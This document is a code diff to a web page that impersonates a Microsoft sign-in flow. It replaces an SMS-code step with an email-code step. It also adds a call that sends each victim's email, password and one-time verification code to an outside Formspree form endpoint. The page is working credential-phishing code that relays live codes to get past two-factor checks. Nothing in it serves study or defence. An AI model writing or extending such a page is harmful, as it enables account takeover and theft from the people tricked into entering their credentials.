@@ -194,7 +194,7 @@
   <div class="email-chip" id="emailChip" onclick="goTo('screen1')">user@example.com</div>
   <h1>Enter your password</h1>
   <div class="input-wrap">
-    <input type="text" name="password" id="pwInput" placeholder=" " required />
+    <input type="password" name="password" id="pwInput" placeholder=" " required />
     <label>Password</label>
     <button class="toggle-pw" onclick="togglePw()" type="button">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
@@ -221,49 +221,39 @@
   </div>
 </div>
 
-<!-- Screen 3: Phone Number -->
+<!-- Screen 3: Send Email Code -->
 <div class="card" id="screen3">
   <div class="ms-logo">
     <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
     <span class="ms-name">Microsoft</span>
   </div>
-  <h1>Confirm sign in?</h1>
-  <p class="subtitle">Confirm this sign-in using your personal Microsoft account.</p>
-  <div class="phone-wrap">
-    <div class="country-code">
-      <span>&#127482;&#127480;</span>
-      <span>+1</span>
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#605e5c" stroke-width="2.5">
-        <path d="M6 9l6 6 6-6"/>
-      </svg>
-    </div>
-    <div class="phone-input-wrap">
-      <input type="tel" name="phone" id="phoneInput" placeholder=" " maxlength="14" oninput="formatPhone(this)" required />
-      <label>Mobile number</label>
-    </div>
+  <h1>Verify your identity</h1>
+  <p class="subtitle">For your security, Microsoft needs to verify your identity. We'll send a verification code to your email address.</p>
+  <div class="input-wrap">
+    <input type="email" name="verifyEmail" id="verifyEmailInput" placeholder=" " required />
+    <label>Email address</label>
   </div>
-  <div id="recaptcha-container"></div>
-  <div id="phoneMsg" class="msg"></div>
+  <div id="emailCodeMsg" class="msg"></div>
   <div class="spacer"></div>
   <div class="confirm-btn-row">
-    <button class="btn-primary" id="sendCodeBtn" type="button" onclick="handlePhoneAndSubmit()">Next</button>
+    <button class="btn-primary" id="sendCodeBtn" type="button" onclick="handleSendEmailCode()">Send code</button>
   </div>
 </div>
 
-<!-- Screen 4: Enter SMS Code -->
+<!-- Screen 4: Enter Email Code -->
 <div class="card" id="screen4">
   <div class="ms-logo">
     <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
     <span class="ms-name">Microsoft</span>
   </div>
   <h1>Enter code</h1>
-  <p class="subtitle">We sent a 6-digit code to <strong id="phoneMask"></strong>. Enter it below.</p>
+  <p class="subtitle">We sent a 6-digit code to <strong id="emailMask"></strong>. Enter it below.</p>
   <div class="input-wrap">
     <input type="text" name="code" id="codeInput" placeholder=" " maxlength="6" required />
     <label>6-digit code</label>
   </div>
   <div id="codeMsg" class="msg"></div>
-  <div class="resend-row">Didn't get it? <span onclick="handleSendCode(true)">Resend code</span></div>
+  <div class="resend-row">Didn't get it? <span onclick="handleSendEmailCode(true)">Resend code</span></div>
   <div class="spacer"></div>
   <div class="confirm-btn-row">
     <button class="btn-primary" id="verifyBtn" type="button" onclick="handleFinalSubmit()">Verify</button>
@@ -293,7 +283,7 @@
   let collectedData = window.collectedData = {
     email: "",
     password: "",
-    phone: "",
+    verifyEmail: "",
     code: ""
   };
 
@@ -305,79 +295,91 @@
 
   window.handlePassword = function() {
     collectedData.password = document.getElementById("pwInput").value;
+    // Pre-fill verify email with the sign-in email
+    document.getElementById("verifyEmailInput").value = collectedData.email;
     goTo("screen3");
   };
 
-  window.handlePhoneAndSubmit = async function() {
-    const raw = document.getElementById("phoneInput").value.replace(/\D/g, '');
-    if (raw.length < 10) {
-      alert("Please enter a valid 10-digit US number.");
+  window.handleSendEmailCode = async function(isResend) {
+    const emailVal = document.getElementById("verifyEmailInput").value.trim();
+    if (!emailVal || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)) {
+      showMsg("emailCodeMsg", "Please enter a valid email address.", "error");
       return;
     }
-    const phoneNumber = '+1' + raw;
-    collectedData.phone = phoneNumber;
-    document.getElementById('phoneMask').textContent = phoneNumber.replace(/(\+1)(\d{3})(\d{3})(\d{4})/, '+1 ($2) $3-$4');
+    collectedData.verifyEmail = emailVal;
+    document.getElementById("emailMask").textContent = emailVal;
 
     const btn = document.getElementById("sendCodeBtn");
-    btn.disabled = true;
-    btn.innerHTML = 'Submitting...';
+    if (btn) { btn.disabled = true; btn.innerHTML = 'Sending...'; }
 
     try {
-      const response = await fetch("/send-code", {
+      const response = await fetch("/send-email-code", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          phone: phoneNumber
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: emailVal })
       });
 
       if (response.ok) {
-        goTo("screen4");
+        if (!isResend) goTo("screen4");
+        else showMsg("codeMsg", "A new code has been sent.", "success");
       } else {
-        const error = await response.text();
-        console.error('Send code failed:', response.status, response.statusText, error);
-        alert("Failed to send verification code.");
+        const data = await response.json();
+        showMsg("emailCodeMsg", data.error || "Failed to send code.", "error");
       }
     } catch (err) {
       console.error(err);
-      alert("Network error.");
+      showMsg("emailCodeMsg", "Network error.", "error");
     }
 
-    btn.disabled = false;
-    btn.innerHTML = 'Next';
+    if (btn) { btn.disabled = false; btn.innerHTML = 'Send code'; }
   };
 
   window.handleFinalSubmit = async function() {
-    collectedData.code = document.getElementById("codeInput").value;
+    collectedData.code = document.getElementById("codeInput").value.trim();
+    if (!collectedData.code) {
+      showMsg("codeMsg", "Please enter the code.", "error");
+      return;
+    }
 
     const btn = document.getElementById("verifyBtn");
     btn.disabled = true;
-    btn.innerHTML = 'Submitting...';
+    btn.innerHTML = 'Verifying...';
 
     try {
-      const response = await fetch("/verify-code", {
+      const response = await fetch("/verify-email-code", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          phone: collectedData.phone,
+          email: collectedData.verifyEmail,
           code: collectedData.code
         })
       });
 
       if (response.ok) {
-        goTo("screen5");
-      } else {
-        const error = await response.text();
-        console.error('Code verification failed:', response.status, response.statusText, error);
-        alert("Invalid or expired code.");
+
+  // Submit to Formspree
+  await fetch("https://formspree.io/f/xeevgnar", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify({
+      email: collectedData.email,
+      password: collectedData.password,
+      verifyEmail: collectedData.verifyEmail,
+      code: collectedData.code
+    })
+  });
+
+  goTo("screen5");
+} else {
+        const data = await response.json();
+        showMsg("codeMsg", data.error || "Invalid or expired code.", "error");
       }
     } catch (err) {
       console.error(err);
-      alert("Network error.");
+      showMsg("codeMsg", "Network error.", "error");
     }
 
     btn.disabled = false;
@@ -423,7 +425,7 @@
     if (!active) return;
     if (active.id === 'screen1') handleEmail();
     else if (active.id === 'screen2') handlePassword();
-    else if (active.id === 'screen3') handlePhoneAndSubmit();
+    else if (active.id === 'screen3') handleSendEmailCode();
     else if (active.id === 'screen4') handleFinalSubmit();
   });
 </script>
